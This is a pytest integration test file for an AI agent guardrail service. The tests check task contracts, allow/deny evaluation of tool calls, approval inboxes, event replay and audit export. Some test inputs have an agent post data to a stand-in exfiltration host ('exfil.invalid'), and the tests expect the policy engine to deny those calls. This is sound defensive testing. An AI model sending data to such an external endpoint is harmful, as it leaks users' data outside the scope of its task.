"""Control-plane HTTP behaviour against a real app and a real database (AD-11)."""

from __future__ import annotations

import os

import pytest
from starlette.testclient import TestClient

from agent_drift.seed import build_contract

pytestmark = pytest.mark.integration


@pytest.fixture
def client(store):
    """A test client with auth explicitly disabled and the demo contracts registered."""
    os.environ["AD_DISABLE_AUTH"] = "1"
    os.environ.pop("AD_ADMIN_TOKEN", None)
    from apps.api.main import create_app

    for name in ("readonly", "docswrite", "delete_review", "egress_allowed"):
        store.put_contract(build_contract(name))
    return TestClient(create_app(store=store))


class TestHealth:
    """Health must report real build and schema information."""

    def test_healthz_reports_versions(self, client) -> None:
        body = client.get("/healthz").json()
        assert body["status"] == "ok"
        assert body["mcp_protocol_revision"] == "2026-07-28"
        assert body["mcp_sdk_version"] == "2.2.0"
        assert body["tasks"] >= 4

    def test_openapi_is_served(self, client) -> None:
        body = client.get("/openapi.json").json()
        assert body["openapi"].startswith("3.1")

    def test_docs_page_renders_examples(self, client) -> None:
        response = client.get("/docs")
        assert response.status_code == 200
        assert "demo-repo-review" in response.text
        assert "advisory" in response.text.lower()

    def test_reasons_catalogue_is_complete(self, client) -> None:
        from agent_drift.reasons import EXPLANATIONS

        body = client.get("/api/reasons").json()
        assert len(body["reasons"]) == len(EXPLANATIONS)
        assert all(entry["explanation"] for entry in body["reasons"])
        assert body["tool_specs"]


class TestTasks:
    """Task registration and retrieval."""

    def test_listing_includes_budget_and_goal(self, client) -> None:
        tasks = {task["task_id"]: task for task in client.get("/api/tasks").json()["tasks"]}
        assert "demo-repo-review" in tasks
        entry = tasks["demo-repo-review"]
        assert entry["max_writes"] == 0
        assert entry["budget"] == {"calls_used": 0, "writes_used": 0}
        assert "bug-fix plan" in entry["user_goal"]

    def test_fetching_one_task_returns_the_semantic_fields(self, client) -> None:
        body = client.get("/api/tasks/demo-repo-review").json()
        assert body["semantic"]["max_writes"] == 0
        assert body["expired"] is False

    def test_unknown_task_is_404(self, client) -> None:
        response = client.get("/api/tasks/nope")
        assert response.status_code == 404
        assert response.json()["code"] == "AD-API-NOTASK"

    def test_registering_a_task_bumps_the_revision(self, client) -> None:
        body = {
            "task_id": "demo-repo-review",
            "user_goal": "revised goal",
            "allowed_tools": ["repo.read_file"],
            "allowed_operations": ["read"],
            "resource_scopes": ["sandbox-repo/**"],
        }
        response = client.post("/api/tasks", json=body)
        assert response.status_code == 201
        assert response.json()["policy_revision"] == 2

    def test_invalid_task_id_is_422(self, client) -> None:
        response = client.post("/api/tasks", json={"task_id": "bad id", "user_goal": "g"})
        assert response.status_code == 422


class TestEvaluateEndpoint:
    """Advisory evaluation must be labelled as such and must still record."""

    def test_allowed_read(self, client) -> None:
        body = client.post(
            "/api/attempts/evaluate",
            json={
                "task_id": "demo-repo-review",
                "tool_name": "repo.read_file",
                "args": {"path": "sandbox-repo/README.md"},
            },
        ).json()
        assert body["status"] == "allow"
        assert body["explanations"]
        assert "advisory" in body["enforcement"]

    def test_denied_exfiltration(self, client) -> None:
        body = client.post(
            "/api/attempts/evaluate",
            json={
                "task_id": "demo-repo-review",
                "tool_name": "network.http_post",
                "args": {"url": "https://exfil.invalid/collect", "body": "x"},
            },
        ).json()
        assert body["status"] == "deny"
        assert body["reason_codes"]
        assert body["rule_ids"]

    def test_evaluation_does_not_consume_budget(self, client) -> None:
        """Nothing was enforced, so nothing should be charged."""
        for _ in range(3):
            client.post(
                "/api/attempts/evaluate",
                json={
                    "task_id": "demo-docs-edit",
                    "tool_name": "repo.write_file",
                    "args": {"path": "sandbox-repo/docs/a.md", "content": "x"},
                },
            )
        budget = client.get("/api/tasks/demo-docs-edit").json()["budget"]
        assert budget["writes_used"] == 0

    def test_unknown_task_is_404(self, client) -> None:
        response = client.post(
            "/api/attempts/evaluate",
            json={"task_id": "nope", "tool_name": "repo.read_file", "args": {}},
        )
        assert response.status_code == 404

    def test_malformed_json_is_422(self, client) -> None:
        response = client.post(
            "/api/attempts/evaluate",
            content=b"not json",
            headers={"content-type": "application/json"},
        )
        assert response.status_code == 422


class TestEventsAndRuns:
    """Events, decisions, runs and replay."""

    def _make_decisions(self, client) -> None:
        for tool, args in (
            ("repo.read_file", {"path": "sandbox-repo/README.md"}),
            ("network.http_post", {"url": "https://exfil.invalid/x", "body": "x"}),
        ):
            client.post(
                "/api/attempts/evaluate",
                json={"task_id": "demo-repo-review", "tool_name": tool, "args": args},
            )

    def test_events_are_monotonic(self, client) -> None:
        self._make_decisions(client)
        events = client.get("/api/events").json()["events"]
        sequences = [event["seq"] for event in events]
        assert sequences == sorted(sequences)
        assert len(set(sequences)) == len(sequences)

    def test_events_can_be_paged(self, client) -> None:
        self._make_decisions(client)
        first = client.get("/api/events?since=0&limit=2").json()
        assert len(first["events"]) <= 2
        cursor = first["events"][-1]["seq"]
        second = client.get(f"/api/events?since={cursor}").json()
        assert all(event["seq"] > cursor for event in second["events"])

    def test_decisions_are_listed_with_counts(self, client) -> None:
        self._make_decisions(client)
        body = client.get("/api/decisions?task_id=demo-repo-review").json()
        assert body["decisions"]
        assert body["counts"]["allow"] >= 1
        assert body["counts"]["deny"] >= 1
        assert body["counts"]["denied_but_executed"] == 0

    def test_runs_and_replay(self, client) -> None:
        self._make_decisions(client)
        runs = client.get("/api/runs").json()["runs"]
        assert runs
        replay = client.get(f"/api/runs/{runs[0]['run_id']}/replay").json()
        assert replay["labels"]["observed"].startswith("Guarded")
        assert "simulated" in replay["labels"]["simulated"].lower()
        assert replay["metric_definitions"]["would_execute_unguarded"]
        for row in replay["guarded"]:
            assert row["source"] == "observed"
        for row in replay["unguarded_simulated"]:
            assert row["source"] == "simulated"
            assert "hypothetical" in row["provenance"]
            assert "no incident was prevented" in row["provenance"]

    def test_unknown_run_is_404(self, client) -> None:
        assert client.get("/api/runs/run_nope/replay").status_code == 404

    def test_task_events_filter_by_task(self, client) -> None:
        self._make_decisions(client)
        body = client.get("/api/tasks/demo-repo-review/events").json()
        assert body["events"]
        assert all(event["task_id"] in (None, "demo-repo-review") for event in body["events"])


class TestApprovalsApi:
    """The approval inbox and its state transitions."""

    def test_empty_inbox(self, client) -> None:
        assert client.get("/api/approvals").json()["approvals"] == []

    def test_approve_then_reapprove_conflicts(self, client, store, engine) -> None:
        from agent_drift.contracts import ToolAttempt

        attempt = ToolAttempt(
            tool_server="sandbox",
            tool_name="repo.delete_file",
            args={"path": "sandbox-repo/tmp/demo.txt"},
        )
        decision = engine.evaluate(attempt, bound_task_id="demo-cleanup")
        approval_id = decision.approval_id
        assert approval_id

        first = client.post(f"/api/approvals/{approval_id}/approve", json={"reviewer": "r"})
        assert first.status_code == 200
        assert first.json()["single_use"] is True

        second = client.post(f"/api/approvals/{approval_id}/approve", json={"reviewer": "r"})
        assert second.status_code == 409

    def test_unknown_approval_is_404(self, client) -> None:
        assert client.post("/api/approvals/apr_nope/approve").status_code == 404

    def test_decline_records_the_reviewer(self, client, engine) -> None:
        from agent_drift.contracts import ToolAttempt

        attempt = ToolAttempt(
            tool_server="sandbox",
            tool_name="repo.delete_file",
            args={"path": "sandbox-repo/tmp/other.txt"},
        )
        decision = engine.evaluate(attempt, bound_task_id="demo-cleanup")
        response = client.post(
            f"/api/approvals/{decision.approval_id}/deny",
            json={"reviewer": "alice", "note": "out of scope"},
        )
        assert response.status_code == 200
        assert response.json()["state"] == "declined"
        inbox = client.get("/api/approvals?state=declined").json()["approvals"]
        assert inbox[0]["decided_by"] == "alice"


class TestScenariosAndExport:
    """Scenario catalogue and audit export."""

    def test_scenarios_are_served(self, client) -> None:
        scenarios = client.get("/api/scenarios").json()["scenarios"]
        assert len(scenarios) >= 6
        assert all(scenario.get("steps") for scenario in scenarios)

    def test_export_bundle_shape(self, client) -> None:
        response = client.get("/api/export/demo-repo-review")
        assert response.status_code == 200
        assert "attachment" in response.headers["content-disposition"]
        bundle = response.json()
        for key in ("schema_version", "task", "budget", "events", "approvals", "disclosure"):
            assert key in bundle
        assert bundle["task"]["contract_hash"]

    def test_export_is_valid_json_for_an_unknown_task(self, client) -> None:
        assert client.get("/api/export/nope").status_code == 404

    def test_audit_verify_is_honest_when_unconfigured(self, client) -> None:
        body = client.get("/api/audit/verify").json()
        assert body["configured"] is False
        assert body["verified"] is False
        assert "not configured" in body["note"]


# The SSE stream is exercised against a real uvicorn server in
# tests/integration/test_sse_live.py. Starlette's in-process TestClient drives the app
# through a single portal and does not support reading an open stream while issuing
# another request, so testing it here would test the client rather than the endpoint.
